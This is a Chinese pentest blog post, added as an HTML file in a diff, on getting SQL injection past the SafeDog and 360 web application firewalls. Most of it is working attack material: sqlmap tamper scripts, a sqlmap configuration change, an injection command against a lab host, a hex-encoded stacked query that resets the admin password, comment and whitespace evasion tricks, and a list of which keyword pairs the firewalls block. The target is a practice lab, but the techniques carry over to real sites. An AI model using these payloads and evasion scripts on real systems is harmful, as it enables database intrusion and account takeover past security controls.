@@ -1,0 +1,423 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+        <meta charset="utf-8" />
+        <title>bypass firewall</title>
+        <link rel="stylesheet" href="/theme/css/main.css" />
+</head>
+
+<body id="index" class="home">
+        <header id="banner" class="body">
+                <h1><a href="/">Follow Your Heart </a></h1>
+                <nav><ul>
+                    <li><a href="/category/pentest.html">Pentest</a></li>
+                    <li><a href="/category/learning.html">Learning</a></li>
+                    <li><a href="/category/python.html">Python</a></li>
+                    <li><a href="/pages/tips.html">Tips</a></li>
+                    <li><a href="/pages/bash.html">Bash</a></li>
+                    <li><a href="/pages/question.html">Question</a></li>
+                    <li><a href="/pages/reverse-shell.html">各种姿势的反弹shell</a></li>
+                </ul></nav>
+        </header><!-- /#banner -->
+<section id="content" class="body">
+  <article>
+    <header>
+      <h1 class="entry-title">
+        <a href="/bypass-firewall.html" rel="bookmark"
+           title="Permalink to bypass firewall">bypass firewall</a></h1>
+    </header>
+<footer class="post-info">
+        <span class="published" title="2017-10-30T00:00:00+01:00">
+                <a href='#'>10/30/2017 </a>
+                <a href="/category/pentest.html">Pentest</a>
+        </span>
+
+
+
+</footer><!-- /.post-info -->
+    <div class="entry-content">
+      
+      <p>狗的绕过比较简单，还是写一下：</p>
+<p><a href="https://secvul.com/topics/876.html">https://secvul.com/topics/876.html</a>
+<a href="http://www.freebuf.com/articles/network/150646.html">http://www.freebuf.com/articles/network/150646.html</a></p>
+<p>根据众多文章的解释，只要把注释符修改下中间加个字符就可以过狗了，比如: <code>/**a**/</code>，tamper.py如下：</p>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env python</span>
+
+<span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">Copyright (c) 2006-2017 sqlmap developers (http://sqlmap.org/)</span>
+<span class="sd">See the file &#39;doc/COPYING&#39; for copying permission</span>
+<span class="sd">&quot;&quot;&quot;</span>
+
+<span class="kn">from</span> <span class="nn">lib.core.enums</span> <span class="kn">import</span> <span class="n">PRIORITY</span>
+
+<span class="n">__priority__</span> <span class="o">=</span> <span class="n">PRIORITY</span><span class="o">.</span><span class="n">LOW</span>
+
+<span class="k">def</span> <span class="nf">dependencies</span><span class="p">():</span>
+    <span class="k">pass</span>
+
+<span class="k">def</span> <span class="nf">tamper</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
+    <span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">    Replaces space character (&#39; &#39;) with comments &#39;/**/&#39;</span>
+
+<span class="sd">    Tested against:</span>
+<span class="sd">        * Microsoft SQL Server 2005</span>
+<span class="sd">        * MySQL 4, 5.0 and 5.5</span>
+<span class="sd">        * Oracle 10g</span>
+<span class="sd">        * PostgreSQL 8.3, 8.4, 9.0</span>
+
+<span class="sd">    Notes:</span>
+<span class="sd">        * Useful to bypass weak and bespoke web application firewalls</span>
+
+<span class="sd">    &gt;&gt;&gt; tamper(&#39;SELECT id FROM users&#39;)</span>
+<span class="sd">    &#39;SELECT/**/id/**/FROM/**/users&#39;</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+
+    <span class="n">retVal</span> <span class="o">=</span> <span class="n">payload</span>
+
+    <span class="k">if</span> <span class="n">payload</span><span class="p">:</span>
+        <span class="n">retVal</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+        <span class="n">quote</span><span class="p">,</span> <span class="n">doublequote</span><span class="p">,</span> <span class="n">firstspace</span> <span class="o">=</span> <span class="bp">False</span><span class="p">,</span> <span class="bp">False</span><span class="p">,</span> <span class="bp">False</span>
+
+        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)):</span>
+            <span class="k">if</span> <span class="ow">not</span> <span class="n">firstspace</span><span class="p">:</span>
+                <span class="k">if</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">.</span><span class="n">isspace</span><span class="p">():</span>
+                    <span class="n">firstspace</span> <span class="o">=</span> <span class="bp">True</span>
+                    <span class="n">retVal</span> <span class="o">+=</span> <span class="s2">&quot;/**s**/&quot;</span>
+                    <span class="k">continue</span>
+
+            <span class="k">elif</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;</span><span class="se">\&#39;</span><span class="s1">&#39;</span><span class="p">:</span>
+                <span class="n">quote</span> <span class="o">=</span> <span class="ow">not</span> <span class="n">quote</span>
+
+            <span class="k">elif</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;&quot;&#39;</span><span class="p">:</span>
+                <span class="n">doublequote</span> <span class="o">=</span> <span class="ow">not</span> <span class="n">doublequote</span>
+
+            <span class="k">elif</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot; &quot;</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">doublequote</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">quote</span><span class="p">:</span>
+                <span class="n">retVal</span> <span class="o">+=</span> <span class="s2">&quot;/**s**/&quot;</span>
+                <span class="k">continue</span>
+
+            <span class="n">retVal</span> <span class="o">+=</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
+
+    <span class="k">return</span> <span class="n">retVal</span>
+</pre></div>
+</td></tr></table>
+
+<p>米有神马技术含量，然后是绕过数字卫士的，这个得分个类，UNION和Error注入，对于这样的注入需要修改以下的步骤：
+首先是修改tamper:</p>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env python</span>
+
+<span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">Copyright (c) 2006-2017 sqlmap developers (http://sqlmap.org/)</span>
+<span class="sd">See the file &#39;LICENSE&#39; for copying permission</span>
+<span class="sd">&quot;&quot;&quot;</span>
+
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">re</span>
+
+<span class="kn">from</span> <span class="nn">lib.core.common</span> <span class="kn">import</span> <span class="n">singleTimeWarnMessage</span>
+<span class="kn">from</span> <span class="nn">lib.core.data</span> <span class="kn">import</span> <span class="n">kb</span>
+<span class="kn">from</span> <span class="nn">lib.core.enums</span> <span class="kn">import</span> <span class="n">DBMS</span>
+<span class="kn">from</span> <span class="nn">lib.core.enums</span> <span class="kn">import</span> <span class="n">PRIORITY</span>
+<span class="kn">from</span> <span class="nn">lib.core.settings</span> <span class="kn">import</span> <span class="n">IGNORE_SPACE_AFFECTED_KEYWORDS</span>
+
+<span class="n">__priority__</span> <span class="o">=</span> <span class="n">PRIORITY</span><span class="o">.</span><span class="n">HIGHER</span>
+
+<span class="k">def</span> <span class="nf">dependencies</span><span class="p">():</span>
+    <span class="n">singleTimeWarnMessage</span><span class="p">(</span><span class="s2">&quot;tamper script &#39;</span><span class="si">%s</span><span class="s2">&#39; is only meant to be run against </span><span class="si">%s</span><span class="s2"> &lt; 5.1&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">basename</span><span class="p">(</span><span class="vm">__file__</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">)[</span><span class="mi">0</span><span class="p">],</span> <span class="n">DBMS</span><span class="o">.</span><span class="n">MYSQL</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">tamper</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
+    <span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">    Adds versioned MySQL comment before each keyword</span>
+
+<span class="sd">    Requirement:</span>
+<span class="sd">        * MySQL &lt; 5.1</span>
+
+<span class="sd">    Tested against:</span>
+<span class="sd">        * MySQL 4.0.18, 5.0.22</span>
+
+<span class="sd">    Notes:</span>
+<span class="sd">        * Useful to bypass several web application firewalls when the</span>
+<span class="sd">          back-end database management system is MySQL</span>
+<span class="sd">        * Used during the ModSecurity SQL injection challenge,</span>
+<span class="sd">          http://modsecurity.org/demo/challenge.html</span>
+
+<span class="sd">    &gt;&gt;&gt; tamper(&quot;value&#39; UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND &#39;QDWa&#39;=&#39;QDWa&quot;)</span>
+<span class="sd">    &quot;value&#39;/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)),/*!0NULL,/*!0NULL#/*!0AND &#39;QDWa&#39;=&#39;QDWa&quot;</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+
+    <span class="k">def</span> <span class="nf">process</span><span class="p">(</span><span class="n">match</span><span class="p">):</span>
+        <span class="n">word</span> <span class="o">=</span> <span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="s1">&#39;word&#39;</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">word</span><span class="o">.</span><span class="n">upper</span><span class="p">()</span> <span class="ow">in</span> <span class="n">kb</span><span class="o">.</span><span class="n">keywords</span> <span class="ow">and</span> <span class="n">word</span><span class="o">.</span><span class="n">upper</span><span class="p">()</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">IGNORE_SPACE_AFFECTED_KEYWORDS</span><span class="p">:</span>
+            <span class="k">return</span> <span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">()</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="n">word</span><span class="p">,</span> <span class="s2">&quot;/*!50001</span><span class="si">%s</span><span class="s2">*/ &quot;</span> <span class="o">%</span> <span class="n">word</span><span class="p">)</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="k">return</span> <span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">()</span>
+
+    <span class="n">retVal</span> <span class="o">=</span> <span class="n">payload</span>
+
+    <span class="k">if</span> <span class="n">payload</span><span class="p">:</span>
+        <span class="n">retVal</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="sa">r</span><span class="s2">&quot;(?&lt;=\W)(?P&lt;word&gt;[A-Za-z_]+)(?=\W|\Z)&quot;</span><span class="p">,</span> <span class="k">lambda</span> <span class="n">match</span><span class="p">:</span> <span class="n">process</span><span class="p">(</span><span class="n">match</span><span class="p">),</span> <span class="n">retVal</span><span class="p">)</span>
+        <span class="n">retVal</span> <span class="o">=</span> <span class="n">retVal</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&quot; /*!50001*/&quot;</span><span class="p">,</span> <span class="s2">&quot;/*!50001*/&quot;</span><span class="p">)</span>
+
+    <span class="k">return</span> <span class="n">retVal</span>
+</pre></div>
+</td></tr></table>
+
+<blockquote>
+<p>注释绕过，如果50001表示如果mysql的版本是5.00.01或者是5.0.1就可以执行这个语句</p>
+<p>比如mysql版本是5.5.53:</p>
+<p><code>select * from users where id=1 /*!50553union*/ /*!50002select*/ 3,2,3 order by id desc;</code></p>
+<p>这个语句是可以执行成功的，如果50553变成50554则执行失败</p>
+</blockquote>
+<p>由于主机卫士会拦截cast，修改sqlmap的配置文件:<code>sqlmap/xml/queries.xml</code>,先备份，然后修改第6行的内容<code>&lt;cast query="CAST(%s AS CHAR)"/&gt;</code>，修改为<code>&lt;cast query="%s"/&gt;</code>。</p>
+<p>这个时候，在注入的时候需要指定<code>--technique</code>为E或者U，盲注在这种情况下是不行的，因为会拦截ord函数。</p>
+<div class="highlight"><pre><span></span><span class="n">sqlmap</span><span class="p">.</span><span class="n">py</span> <span class="o">-</span><span class="n">u</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">141</span><span class="p">.</span><span class="mi">200</span><span class="o">/</span><span class="n">sqli</span><span class="o">-</span><span class="n">labs</span><span class="o">/</span><span class="k">Less</span><span class="o">-</span><span class="mi">1</span><span class="o">/</span><span class="k">index</span><span class="p">.</span><span class="n">php</span><span class="err">\</span><span class="o">?</span><span class="n">id</span><span class="err">\</span><span class="o">=</span><span class="mi">1</span> <span class="c1">--tamper fuck360.py -v 3 --dbs    --union-col 3 --threads 5 --password --technique E --flush-session</span>
+</pre></div>
+
+
+<p>盲注bypass的尝试:
+* 在<code>sqlmap/txt/keywords.txt</code>里面添加了<code>SLEEP</code>，就是在注入的时候，添加SLEEP为关键词注释掉</p>
+<p>因为在注入的时候同样使用了ord函数。
+盲注的函数，</p>
+<div class="highlight"><pre><span></span><span class="n">pow</span><span class="p">()</span> <span class="err">计算平方的，对于字母来说貌似结果都一样</span> <span class="n">pass</span>
+<span class="n">pi</span><span class="p">()</span>
+<span class="n">exp</span><span class="p">()</span> <span class="err">以</span><span class="n">e为底的指函数</span>
+<span class="n">ceil</span><span class="p">()</span> <span class="err">向上取整</span>
+<span class="n">sqrt</span><span class="p">()</span> <span class="err">给定值的平方根</span>
+<span class="n">floor</span><span class="p">()</span> <span class="err">向下取整</span>
+<span class="n">ceiling</span><span class="p">()</span> <span class="err">向上取整</span>
+</pre></div>
+
+
+<p>被拦截的函数，</p>
+<div class="highlight"><pre><span></span><span class="n">ascii</span><span class="p">()</span>
+<span class="n">hex</span><span class="p">()</span>
+<span class="n">unhex</span><span class="p">()</span>
+<span class="n">ord</span><span class="p">()</span>
+<span class="nb">char</span><span class="p">()</span>
+</pre></div>
+
+
+<p>参考<a href="http://www.cnblogs.com/xiaozi/p/7275134.html">http://www.cnblogs.com/xiaozi/p/7275134.html</a>这篇文章里面的替换:</p>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env python</span>
+
+<span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">write by Aaron</span>
+<span class="sd">&quot;&quot;&quot;</span>
+<span class="kn">from</span> <span class="nn">lib.core.enums</span> <span class="kn">import</span> <span class="n">PRIORITY</span>
+<span class="kn">from</span> <span class="nn">lib.core.settings</span> <span class="kn">import</span> <span class="n">UNICODE_ENCODING</span>
+<span class="n">__priority__</span> <span class="o">=</span> <span class="n">PRIORITY</span><span class="o">.</span><span class="n">LOW</span>
+<span class="k">def</span> <span class="nf">dependencies</span><span class="p">():</span>
+    <span class="k">pass</span>
+<span class="k">def</span> <span class="nf">tamper</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
+    <span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">    Replaces keywords</span>
+<span class="sd">    &gt;&gt;&gt; tamper(&#39;UNION SELECT id FROM users&#39;)</span>
+<span class="sd">    &#39;union%0a/*!12345select*/id%0a/*!12345from*/users&#39;</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="k">if</span> <span class="n">payload</span><span class="p">:</span>
+        <span class="n">payload</span><span class="o">=</span><span class="n">payload</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&quot; ALL SELECT &quot;</span><span class="p">,</span><span class="s2">&quot;%0a/*!12345select*/&quot;</span><span class="p">)</span>
+        <span class="n">payload</span><span class="o">=</span><span class="n">payload</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&quot;UNION SELECT&quot;</span><span class="p">,</span><span class="s2">&quot;union%0a/*!12345select*/&quot;</span><span class="p">)</span>
+        <span class="n">payload</span><span class="o">=</span><span class="n">payload</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&quot; FROM &quot;</span><span class="p">,</span><span class="s2">&quot;%0a/*!12345from*/&quot;</span><span class="p">)</span>
+        <span class="n">payload</span><span class="o">=</span><span class="n">payload</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&quot;CONCAT&quot;</span><span class="p">,</span><span class="s2">&quot;CONCAT</span><span class="si">%23%</span><span class="s2">0a&quot;</span><span class="p">)</span>
+        <span class="n">payload</span><span class="o">=</span><span class="n">payload</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&quot;CASE &quot;</span><span class="p">,</span><span class="s2">&quot;CASE</span><span class="si">%23%</span><span class="s2">0a&quot;</span><span class="p">)</span>
+        <span class="n">payload</span><span class="o">=</span><span class="n">payload</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&quot;CAST(&quot;</span><span class="p">,</span><span class="s2">&quot;/*!12345CASt(*/&quot;</span><span class="p">)</span>
+        <span class="n">payload</span><span class="o">=</span><span class="n">payload</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&quot;DATABASE()&quot;</span><span class="p">,</span><span class="s2">&quot;database%0a()&quot;</span><span class="p">)</span>
+
+    <span class="k">return</span> <span class="n">payload</span>
+</pre></div>
+</td></tr></table>
+
+<p>所以只要把ORD函数給注释包含就可以。</p>
+<p>网站卫士和主机卫士不同，貌似网站卫士更严格。测试下如何绕过。</p>
+<p>主机卫士不是最新版，fucck</p>
+<h3>预编译注入</h3>
+<p>set @x=0x73656c656374202a2066726f6d206d7973716c2e757365723b;prepare a from @x;execute a;
+prepare a from 'select user()';execute a;</p>
+<p>一般情况下PDO只会返回第一条SQL语句的结果，一般执行一个update语句，将需要的数据更新到某个可见的字段中，或者使用sleep盲注。</p>
+<p>set(@x=757064617465207573657220736574207077643D31313120776865726520757365726E616D653D2761646D696E27);prepare(a)from(@x);execute(a)</p>
+<p>set @x=0x73656c656374202a2066726f6d206d7973716c2e757365723b;prepare a from @x;execute a;
+prepare a from 'select user()';execute a;</p>
+<p>union select 拦截
+select union 不拦截 
+select from 拦截
+select all 不拦截
+updatexml select 拦截</p>
+<p>注释:</p>
+<div class="highlight"><pre><span></span><span class="o">#</span>
+<span class="c1">-- </span>
+<span class="c1">-- -</span>
+<span class="c1">--+</span>
+<span class="o">//</span>
+<span class="cm">/**/</span>
+<span class="cm">/*abcd*/</span>
+<span class="p">;</span><span class="o">%</span><span class="mi">00</span>
+</pre></div>
+
+
+<p>空白字符：</p>
+<p>09 0A 0B 0C 0D A0 20</p>
+<p>字符串连接函数:
+concat
+concat_ws</p>
+<p>除去GET以外，其他过滤最弱。</p>
+<div class="highlight"><pre><span></span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="o">|</span><span class="nv">@pwd</span><span class="err">:</span><span class="o">=</span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="k">user</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">where</span><span class="w"> </span>
+<span class="n">id</span><span class="o">=</span><span class="mi">4</span><span class="p">)</span><span class="cm">/*ddd*/</span><span class="ow">union</span><span class="cm">/*ddd*/</span><span class="k">select</span><span class="w"> </span><span class="k">null</span><span class="p">,</span><span class="nv">@pwd</span><span class="w"></span>
+</pre></div>
+
+
+<div class="highlight"><pre><span></span><span class="k">union</span> <span class="k">select</span> <span class="err">拦截</span>
+<span class="k">select</span> <span class="k">from</span> <span class="err">拦截</span>
+<span class="n">updatexml</span> <span class="k">select</span> <span class="err">拦截</span>
+<span class="k">select</span> <span class="k">all</span> <span class="k">from</span> <span class="err">拦截</span>
+<span class="k">select</span> <span class="k">distinct</span> <span class="k">from</span> <span class="err">拦截</span>
+<span class="k">select</span> <span class="n">distinctrow</span> <span class="k">from</span> <span class="err">拦截</span>
+
+<span class="k">select</span> <span class="k">all</span> <span class="k">union</span> <span class="err">不拦截</span>
+<span class="k">select</span> <span class="k">all</span> <span class="err">不拦截</span>
+<span class="k">select</span> <span class="k">union</span> <span class="err">不拦截</span> 
+<span class="k">union</span> <span class="k">from</span> <span class="err">不拦截</span>
+</pre></div>
+    </div><!-- /.entry-content -->
+
+  </article>
+</section>
+        <section id="extras" class="body">
+        </section><!-- /#extras -->
+
+
+</body>
+</html>
